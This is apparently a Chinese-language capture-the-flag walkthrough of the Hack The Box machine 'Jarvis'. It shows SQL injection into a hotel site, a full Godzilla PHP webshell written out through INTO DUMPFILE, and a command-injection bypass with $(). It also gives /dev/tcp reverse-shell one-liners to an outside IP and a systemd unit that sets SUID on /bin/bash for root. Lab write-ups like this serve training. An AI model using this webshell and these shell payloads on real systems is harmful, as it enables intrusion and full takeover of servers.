### Hack The Box Jarvis

Hack The Box归类为中等难度，个人感觉涉及到的技术难度不是很高，只是技术点比较多比较杂。

和往常一样，拿到IP先用Nmap扫一下。

```shell
┌──(root㉿kali)-[/usr/share/wordlists/wfuzz/webservices]
└─# nmap -sV -sC 10.10.10.143
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 19:07 CST
Nmap scan report for 10.10.10.143
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03f34e22363e3b813079ed4967651667 (RSA)
|   256 25d808a84d6de8d2f8434a2c20c85af6 (ECDSA)
|_  256 77d4ae1fb0be151ff8cdc8153ac369e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.19 seconds
```

-sV和-sC参数扫出来的端口不是很准确，建议再所有端口扫一遍。

```shell
┌──(root㉿kali)-[/usr/share/wordlists/wfuzz/webservices]
└─# nmap -p- --open  10.10.10.143
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 14:00 CST
Nmap scan report for 10.10.10.143
Host is up (0.30s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 87.75 seconds
```

比第一次的结果多了64999端口，虽然后面用不到，但是信息收集还是要做全。

访问80端口

![image-20230613135422055](/images/1.png)

这里左上角给出了域名：supersecurehotel.htb，可以在/etc/hosts中手动解析到10.10.10.143，也可以用IP直接访问，没区别。

页面中随便点一点，暂时没发现有啥突破口，dirsearch扫一下目录：

```shell
[2023- 6-13 13:57:05 CST] Fanxiaoyao tools/dirsearch
🔍🤡 -> python3 dirsearch.py -u http://10.10.10.143/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11710

Output: /Users/xxx/workspace/tools/dirsearch/reports/http_10.10.10.143/__23-06-13_13-57-14.txt

Target: http://10.10.10.143/

[13:57:14] Starting:
[13:57:36] 301 -  309B  - /js  ->  http://10.10.10.143/js/
[13:57:57] 403 -  298B  - /.ht_wsr.txt
[13:57:57] 403 -  302B  - /.htaccess_extra
[13:57:57] 403 -  301B  - /.htaccess.orig
[13:57:57] 403 -  301B  - /.htaccess_orig
[13:57:57] 403 -  301B  - /.htaccess.save
[13:57:57] 403 -  301B  - /.htaccess.bak1
[13:57:57] 403 -  303B  - /.htaccess.sample
[13:57:57] 403 -  299B  - /.htaccessBAK
[13:57:57] 403 -  299B  - /.htaccess_sc
[13:57:57] 403 -  299B  - /.htaccessOLD
[13:57:57] 403 -  300B  - /.htaccessOLD2
[13:57:57] 403 -  292B  - /.html
[13:57:57] 403 -  291B  - /.htm
[13:57:58] 403 -  298B  - /.httr-oauth
[13:57:58] 403 -  297B  - /.htpasswds
[13:57:58] 403 -  301B  - /.htpasswd_test
[13:58:08] 403 -  292B  - /.php3
[13:58:08] 403 -  291B  - /.php
[14:00:55] 301 -  310B  - /css  ->  http://10.10.10.143/css/
[14:01:30] 301 -  312B  - /fonts  ->  http://10.10.10.143/fonts/
[14:01:30] 200 -    2KB - /footer.php
[14:01:51] 301 -  313B  - /images  ->  http://10.10.10.143/images/
[14:01:51] 200 -    7KB - /images/
[14:02:04] 200 -    3KB - /js/
[14:02:59] 301 -  317B  - /phpmyadmin  ->  http://10.10.10.143/phpmyadmin/
[14:03:05] 200 -    1KB - /phpmyadmin/README
[14:03:05] 200 -   15KB - /phpmyadmin/doc/html/index.html
[14:03:05] 200 -   15KB - /phpmyadmin/
[14:03:06] 200 -   15KB - /phpmyadmin/index.php
[14:03:06] 200 -   19KB - /phpmyadmin/ChangeLog
[14:03:33] 403 -  301B  - /server-status/
[14:03:33] 403 -  300B  - /server-status

Task Completed
```

可以看到phpmyadmin

![image-20230613135825474](/images/2.png)

试了一下爆破未果，暂时搁置，回到主页继续找突破口。

意外发现在房间订购页面存在带参数的get请求：http://10.10.10.143/room.php?cod=1

![image-20230613140049267](/images/3.png)

试一下sql注入：	![image-20230613140220176](/images/4.png)

存在sql注入，并且http://10.10.10.143/room.php?cod=1和http://10.10.10.143/room.php?cod=2-1返回相同页面，判断为数字型sql注入。

查列数：

![image-20230613140420043](/images/5.png)

order by 7时返回正常，order by 8无回显：

![image-20230613140509955](/images/6.png)

查看回显：

![image-20230613142800888](/images/7.png)

2,3,4,5有回显，尝试手工注入（有WAF，sqlmap会被拦截，可以通过空格改/**/绕过，或者其他方法，fuzz一下即可，这里我就纯收工注入了）

数据库为mysql：

![image-20230613143158658](/images/8.png)

查表名，查列名，但是这里没什么有用的信息。

![image-20230613143447481](/images/9.png)

查一下用户名和密码以及文件权限：

![image-20230613144610159](/images/10.png)

到这里https://www.cmd5.com/解密一下，得出密码为imissyou。用帐号密码登陆phpmyadmin。

secure_file_priv为空，可写shell。

![image-20230613145522997](/images/11.png)

找一下网站的跟目录，操作系统是debian，中间件是apache。debian下的apache配置文件路经为/etc/apache2/apache2.conf。网站跟目录的配置文件在：/etc/apache2/sites-available/000-default.conf。

执行sql语句查看文件：

![image-20230613160256721](/images/12.png)

向目录下下写个哥斯拉马（其实一句话就ok），多行的话用dumpfile，不要用outfile（会转义/n）,写入内容中的单引号前面记得加'\\'

```sql
SELECT '<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass=\'fanxiaoyao\';
$payloadName=\'payload\';
$key=\'e512ecba478e0be2\';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}' INTO DUMPFILE "/var/www/html/iindex.php"
```

![image-20230613161016662](/images/13.png)

哥斯拉连接,进入shell

![image-20230613161343980](/images/14.png)

发送反向shell创建一个完整的shell。

![image-20230613165122931](/images/15.png)

反弹过来的shell交互性太差，所以我们需要先升级一下shell：

执行：

```python
python3 -c "import pty; pty.spawn('/bin/bash')"
#这段代码是在Python中使用pty模块创建一个交互式的bash终端。pty.spawn()函数会启动一个新的进程，并将其连接到一个伪终端（pseudo-terminal），然后将标准输入、标准输出和标准错误输出重定向到该伪终端。
#设置环境变量
export SHELL=bash
export TERM=xterm-256color #允许 clear，并且有颜色
```

ctrl+z暂停shell

```shell
stty raw -echo;fg
#键入reset，回车
```

升级完成

![image-20230613165346746](/images/16.png)

目前为www-data用户，尝试提权到user

```shell
www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

可以执行/var/www/Admin-Utilities/simpler.py，看一下这个py程序

```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

漏洞点在于'-p'功能，虽然过滤了['&', ';', '-', '`', '||', '|']，但是仍可以通过$(command)执行命令（在bash中$()中的语句会作为变量传递）。

```shell
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.2/8888 0>&1"' > /tmp/rs.sh
```

添加可执行的权限：

```shell
chmod +x /tmp/rs.sh
```

执行：

![image-20230613172334061](/images/18.png)

拿到user权限。

下一步提权拿root权限，本机开一个http服务，靶机从宿主机下载一个linpeas.sh

执行发现：systemctl被有suid权限。

自己写个服务提权(先按照前面的流程再升级一次shell)：

```ini
[Unit]
Description = some descriptions

[Service]
Type = simple
ExecStart = /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.2/6666 0>&1"
#or
ExecStart = chmod u+s /bin/bash
[Install]
WantedBy=multi-user.target
```

```shell
pepper@jarvis:/var/www/html$ echo "[Unit]
> Description = some descriptions
>
> [Service]
> Type = simple
> ExecStart = chmod u+s /bin/bash
> [Install]
> WantedBy=multi-user.target" > /dev/shm/root.service
pepper@jarvis:/var/www/html$ cat /dev/shm/root.service
[Unit]
Description = some descriptions

[Service]
Type = simple
ExecStart = chmod u+s /bin/bash
[Install]
WantedBy=multi-user.target
```

写service到 /dev/shm目录下

```shell
systemctl link /dev/shm/root.service
```

链接服务到/etc/systemd/system/
/dev/shm是一个特殊的目录，不在硬盘上，而在内存里
/etc/systemd/system/目录非root不可写，这个时候用/dev/shm即可成功链接

```shell
pepper@jarvis:/dev/shm$ systemctl link /dev/shm/root.service
pepper@jarvis:/dev/shm$ systemctl start root.service
#-rwsr-中的s代表suid
pepper@jarvis:/dev/shm$ ls /bin/bash -al
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
#-p 以特权运行
pepper@jarvis:/dev/shm$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4#
```

如果用/tmp目录而非/dev/shm：

```shell
pepper@jarvis:/dev/shm$ echo '[Unit]
> Description = 123
> [Service]
> Type = simple
> ExecStart = /bin/bash -c "chmod u+s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > /tmp/root1.service
pepper@jarvis:/dev/shm$ system link /tmp/root1.service
bash: system: command not found
```

拿到system权限

